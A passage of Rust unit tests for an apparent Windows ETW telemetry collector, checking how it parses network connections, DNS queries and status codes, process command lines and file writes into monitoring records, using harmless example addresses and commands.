                ("sport", EtwValue::Int(0, 51000u16.to_be_bytes().to_vec())),
            ],
        );
        let c = network_connection(&r, Some("x.exe".into())).unwrap();
        assert_eq!(
            (c.dst_addr.as_str(), c.dst_port, c.src_port),
            ("10.20.0.5", 443, 51000)
        );
        assert_eq!(c.pid, Some(1234));
        assert_eq!(c.state, "established");

        let mut accept = r.clone();
        accept.id = 15;
        let a = network_connection(&accept, None).unwrap();
        assert_eq!(
            (a.dst_addr.as_str(), a.dst_port, a.state.as_str()),
            ("10.20.0.50", 51000, "accepted")
        );

        let mut v6 = r.clone();
        v6.id = 28;
        v6.props.insert(
            "daddr".into(),
            EtwValue::Bytes("2001:db8::1".parse::<Ipv6Addr>().unwrap().octets().to_vec()),
        );
        v6.props.insert(
            "saddr".into(),
            EtwValue::Bytes(Ipv6Addr::LOCALHOST.octets().to_vec()),
        );
        let c6 = network_connection(&v6, None).unwrap();
        assert_eq!(
            (c6.protocol.as_str(), c6.dst_addr.as_str()),
            ("tcp6", "2001:db8::1")
        );

        let mut other = r.clone();
        other.id = 10; // data sent: not a connection start
        assert!(network_connection(&other, None).is_none());
    }

    #[test]
    fn dns_query_parses_results() {
        let r = rec(
            DNS_CLIENT,
            3008,
            &[
                ("QueryName", s("login.microsoftonline.com.")),
                ("QueryType", int(1, 2)),
                ("QueryStatus", int(0, 4)),
                (
                    "QueryResults",
                    s("type:  5 login.mso.msidentity.com;20.190.159.0;::ffff:20.190.159.0;"),
                ),
            ],
        );
        let (pid, d) = dns_query(&r).unwrap();
        assert_eq!(pid, 4);
        assert_eq!(d.qname, "login.microsoftonline.com");
        assert_eq!(d.qtype, "A");
        assert_eq!(d.rcode, "NOERROR");
        assert_eq!(d.cnames, vec!["login.mso.msidentity.com".to_string()]);
        assert_eq!(d.resolved_ips, vec!["20.190.159.0".to_string()]);

        let nx = rec(
            DNS_CLIENT,
            3008,
            &[
                ("QueryName", s("nope.corp")),
                ("QueryType", int(28, 2)),
                ("QueryStatus", int(9003, 4)),
            ],
        );
        let (_, d) = dns_query(&nx).unwrap();
        assert_eq!((d.qtype.as_str(), d.rcode.as_str()), ("AAAA", "NXDOMAIN"));
        assert!(dns_query(&rec(DNS_CLIENT, 3006, &[("QueryName", s("x"))])).is_none());
    }

    #[test]
    fn dns_authority_records_are_not_cnames() {
        // Negative answer: Windows lists the zone's SOA (type 6), whose first
        // field is the primary nameserver. That is not an alias.
        let r = rec(
            DNS_CLIENT,
            3008,
            &[
                ("QueryName", s("nope.example.com")),
                ("QueryType", int(1, 2)),
                ("QueryStatus", int(9003, 4)),
                (
                    "QueryResults",
                    s("type:  6 ns1.example.com hostmaster.example.com 1 900 300 604800 60;"),
                ),
            ],
        );
        let (_, d) = dns_query(&r).unwrap();
        assert_eq!(d.rcode, "NXDOMAIN");
        assert!(d.cnames.is_empty(), "{:?}", d.cnames);
        assert!(d.resolved_ips.is_empty());

        let (ips, cnames) = parse_query_results(
            "type:  5 a.example;type:  2 ns.example;1.2.3.4;1.2.3.4;::ffff:1.2.3.4;2001:db8::1;",
        );
        assert_eq!(cnames, vec!["a.example".to_string()]);
        assert_eq!(ips, vec!["1.2.3.4".to_string(), "2001:db8::1".to_string()]);
    }

    #[test]
    fn rcode_maps_dns_statuses_and_never_leaks_win32_numbers() {
        for (status, want) in [
            (0, "NOERROR"),
            (9001, "FORMERR"),
            (9002, "SERVFAIL"),
            (9003, "NXDOMAIN"),
            (9004, "NOTIMP"),
            (9005, "REFUSED"),
            (9009, "NOTAUTH"),
            (9501, "NODATA"),
            (9701, "NODATA"),
            (1460, "TIMEOUT"),
            (10060, "TIMEOUT"),
            (87, "UNKNOWN"),
            (123_456, "UNKNOWN"),
        ] {
            assert_eq!(rcode(status), want, "status {status}");
        }
    }

    #[test]
    fn process_start_prefers_payload_then_early_capture_and_caps_length() {
        let base = [
            ("ProcessID", int(4242, 4)),
            ("CreateTime", int(133_000_000_000_000_000, 8)),
            ("ImageName", s("C:\\Windows\\System32\\cmd.exe")),
        ];
        // The kernel payload beats a (possibly stale) captured value.
        let mut props = base.to_vec();
        props.push(("CommandLine", s("cmd /c echo payload")));
        let p = process_start(
            &rec(KERNEL_PROCESS, 1, &props),
            &devices(),
            ProcessEnrichment {
                cmdline: Some("cmd /c echo captured".into()),
                username: Some("CORP\\anna".into()),
                ..Default::default()
            },
        )
        .unwrap();
        assert_eq!(p.cmdline, "cmd /c echo payload");
        assert!(p.enrichment.enrichment_errors.is_empty());

        // Without a payload the early capture is used.
        let r = rec(KERNEL_PROCESS, 1, &base);
        let p = process_start(
            &r,
            &devices(),
            ProcessEnrichment {
                cmdline: Some("cmd /c echo captured".into()),
                username: Some("CORP\\anna".into()),
                ..Default::default()
            },
        )
        .unwrap();
        assert_eq!(p.cmdline, "cmd /c echo captured");

        // Nothing at all: partial, both fields reported.
        let p = process_start(&r, &devices(), ProcessEnrichment::default()).unwrap();
        assert!(p.cmdline.is_empty() && p.username == "unknown");
        assert!(p.enrichment.enrichment_errors.contains_key("cmdline"));
        assert!(p.enrichment.enrichment_errors.contains_key("username"));

        // Oversized command lines are capped and marked.
        let huge = "x".repeat(crate::telemetry::limits::MAX_CMDLINE_BYTES + 10);
        let p = process_start(
            &r,
            &devices(),
            ProcessEnrichment {
                cmdline: Some(huge),
                ..Default::default()
            },
        )
        .unwrap();
        assert_eq!(p.cmdline.len(), crate::telemetry::limits::MAX_CMDLINE_BYTES);
        assert!(p.enrichment.truncated_fields.contains_key("cmdline"));
    }

    #[test]
    fn early_capture_wins_and_late_lookup_fills_gaps() {
        let early = ProcessEnrichment {
            cmdline: Some("reg add HKCU\\x".into()),
            username: Some(String::new()), // failed read counts as missing
            ..Default::default()
        };
        let late = ProcessEnrichment {
            exe: Some("C:\\Windows\\System32\\reg.exe".into()),
            cmdline: Some("stale".into()),
            username: Some("CORP\\anna".into()),
            exe_sha256: Some("sha256:ab".into()),
            ..Default::default()
        };
        let m = early.prefer_over(late);
        assert_eq!(m.cmdline.as_deref(), Some("reg add HKCU\\x"));
        assert_eq!(m.username.as_deref(), Some("CORP\\anna"));
        assert_eq!(m.exe.as_deref(), Some("C:\\Windows\\System32\\reg.exe"));
        assert_eq!(m.exe_sha256.as_deref(), Some("sha256:ab"));
        let none = ProcessEnrichment::default().prefer_over(ProcessEnrichment::default());
        assert!(none.cmdline.is_none() && none.username.is_none());
    }

    fn file_rec(id: u16, pid: u32, ts: i64, props: &[(&str, EtwValue)]) -> EtwRecord {
        let mut r = rec(KERNEL_FILE, id, props);
        r.header_pid = pid;
        r.timestamp = ts;
        r
    }

    #[test]
    fn file_create_and_write_name_the_issuing_process() {
        let mut t = FileObjects::default();
        let d = devices();
        let name = s("\\Device\\HarddiskVolume3\\Users\\a\\x.txt");
        // FILE_OPEN (1): proves nothing yet, but remembers the object.
        let open = file_rec(
            12,
            900,
            0,
            &[
                ("FileObject", int(7, 8)),
                ("FileName", name.clone()),
                ("CreateOptions", int(1 << 24, 4)),
            ],
        );
        assert!(t.observe(&open, &d).is_none());
        let w = file_rec(16, 900, 50_000_000, &[("FileObject", int(7, 8))]);
        let touch = t.observe(&w, &d).unwrap();
        assert_eq!(
            (touch.pid, touch.path.as_str()),
            (900, "C:\\Users\\a\\x.txt")
        );
        // Bulk writes inside a second are one attribution.
        let w2 = file_rec(16, 900, 50_000_100, &[("FileObject", int(7, 8))]);
        assert!(t.observe(&w2, &d).is_none());
        let w3 = file_rec(16, 901, 70_000_000, &[("FileObject", int(7, 8))]);
        assert_eq!(t.observe(&w3, &d).unwrap().pid, 901);
        // Close forgets the object; an unknown object is never attributed.
        t.observe(&file_rec(14, 900, 0, &[("FileObject", int(7, 8))]), &d);
        assert!(t
            .observe(
                &file_rec(16, 900, 99_000_000, &[("FileObject", int(7, 8))]),
                &d
            )
            .is_none());
    }

    #[test]
    fn file_create_dispositions_and_directories() {
        let d = devices();
        let mut t = FileObjects::default();
        let mk = |obj: u64, disp: u64, extra: u64| {
            file_rec(
                12,
                5,
                1,
                &[
                    ("FileObject", int(obj, 8)),
                    ("FileName", s("C:\\a\\f")),
                    ("CreateOptions", int((disp << 24) | extra, 4)),
                ],
            )
        };
        assert!(t.observe(&mk(1, 2, 0), &d).is_some(), "FILE_CREATE");
        assert!(t.observe(&mk(2, 5, 0), &d).is_some(), "FILE_OVERWRITE_IF");
        assert!(
            t.observe(&mk(3, 3, 0), &d).is_none(),
            "FILE_OPEN_IF may only open"
        );
        assert!(
            t.observe(&mk(4, 2, FILE_DIRECTORY_FILE), &d).is_none(),
            "directory"
        );
        let mut other = mk(5, 2, 0);
        other.provider = KERNEL_NETWORK;
        assert!(t.observe(&other, &d).is_none());
        let mut nopid = mk(6, 2, 0);
        nopid.header_pid = 0;
        assert!(t.observe(&nopid, &d).is_none());
    }

    #[test]
    fn file_object_table_is_bounded() {
        let d = devices();
        let mut t = FileObjects::default();
        for i in 0..(FILE_OBJECTS_MAX as u64 + 1) {
            t.observe(
                &file_rec(
                    12,
                    5,
                    1,
                    &[
                        ("FileObject", int(i, 8)),
                        ("FileName", s("C:\\f")),
                        ("CreateOptions", int(1 << 24, 4)),
                    ],
                ),
                &d,
            );
        }
        assert_eq!(t.overflows, 1);
        assert!(t.paths.len() <= FILE_OBJECTS_MAX);
    }

    fn dns_hint_rec(id: u16, name: &str, server: &str, ts: i64) -> EtwRecord {
        let mut r = rec(
            DNS_CLIENT,
            id,
            &[
                ("QueryName", s(name)),
                ("QueryType", int(1, 2)),
                ("DnsServerIpAddress", s(server)),
            ],
        );
        r.timestamp = ts;
        r
    }

    #[test]
    fn dns_server_comes_only_from_a_valid_query_sent_event() {
        let mut h = DnsServerHints::default();
        h.note(&dns_hint_rec(3010, "Example.COM.", "10.0.0.53", 100));
        h.note(&dns_hint_rec(3010, "bad.example", "not-an-ip", 100));
        h.note(&dns_hint_rec(3006, "ignored.example", "10.0.0.1", 100));
        assert_eq!(h.take("example.com", 1, 200).as_deref(), Some("10.0.0.53"));
        assert!(h.take("example.com", 1, 200).is_none(), "consumed once");
        assert!(h.take("bad.example", 1, 200).is_none());
        assert!(h.take("ignored.example", 1, 200).is_none());
        h.note(&dns_hint_rec(3011, "old.example", "[2001:db8::53]", 0));
        assert!(
            h.take("old.example", 1, DNS_HINT_TTL_TICKS + 1).is_none(),
            "stale"
        );
        for i in 0..(DNS_HINT_MAX + 5) {
            h.note(&dns_hint_rec(
                3010,
                &format!("h{i}.example"),
                "10.0.0.53",
                1,
            ));
        }
        assert!(h.map.len() <= DNS_HINT_MAX);
    }

    #[test]
    fn dns_completion_keeps_raw_status_and_invents_no_client_or_txid() {
        let r = rec(
            DNS_CLIENT,
            3008,
            &[
                ("QueryName", s("x.example")),
                ("QueryType", int(1, 2)),
                ("QueryStatus", int(9003, 4)),
            ],
        );
        let (_, d) = dns_query(&r).unwrap();
        assert_eq!(d.query_status, Some(9003));
        assert_eq!(
            (
                d.client_addr.as_str(),
                d.server_addr.as_str(),
                d.transaction_id
            ),
            ("", "", 0)
        );
    }

    fn net_rec(id: u16, size: u64, flip: bool) -> EtwRecord {
        let (l, r, lp, rp): ([u8; 4], [u8; 4], u16, u16) =
            ([10, 0, 0, 5], [93, 184, 216, 34], 51000, 443);
        let (sa, da, sp, dp) = if flip { (r, l, rp, lp) } else { (l, r, lp, rp) };
        let mut x = rec(
            KERNEL_NETWORK,
            id,
            &[
                ("PID", int(77, 4)),
                ("size", int(size, 4)),
                ("saddr", EtwValue::Int(0, sa.to_vec())),
                ("daddr", EtwValue::Int(0, da.to_vec())),
                ("sport", EtwValue::Int(0, sp.to_be_bytes().to_vec())),
                ("dport", EtwValue::Int(0, dp.to_be_bytes().to_vec())),
            ],
        );
        x.timestamp = 1_000_000_000;
        x
    }

    #[test]
    fn network_bytes_aggregate_per_flow_and_emit_on_close() {
        let mut f = NetFlows::default();
        let connect = net_rec(12, 0, false);
        let data = network_connection(&connect, None).unwrap();
        assert!(f.open(&data, connect.timestamp).is_none());
        assert!(f.observe(&net_rec(10, 100, false)).is_none());
        assert!(
            f.observe(&net_rec(10, 50, true)).is_none(),
            "other orientation, same flow"
        );
        assert!(f.observe(&net_rec(11, 4000, false)).is_none());
        let mut close = net_rec(13, 0, false);
        close.timestamp += 25_000_000;
        let c = f.observe(&close).unwrap();
        assert_eq!((c.bytes_sent, c.bytes_recv), (Some(150), Some(4000)));
        assert_eq!((c.state.as_str(), c.duration_ms), ("closed", Some(2500)));
        assert_eq!((c.dst_addr.as_str(), c.dst_port), ("93.184.216.34", 443));
        assert!(f.flows.is_empty() && f.order.is_empty());
        // Traffic of a flow that was never seen opening reports nothing.
        assert!(f.observe(&net_rec(10, 9, false)).is_none());
        assert_eq!(f.untracked, 1);
    }

    #[test]
    fn network_flow_table_is_bounded_and_flushes_evictions() {
        let mut f = NetFlows::default();
        let base = network_connection(&net_rec(12, 0, false), None).unwrap();
        let mut flushed = 0;
        for i in 0..(FLOWS_MAX as u16 + 3) {
            let mut d = base.clone();
            d.src_port = 1000 + i;
            if let Some(e) = f.open(&d, 1) {
                assert_eq!((e.state.as_str(), e.bytes_sent), ("open", Some(0)));
                flushed += 1;
            }
        }
        assert_eq!(flushed, 3);
        assert_eq!(f.flows.len(), FLOWS_MAX);
    }
}
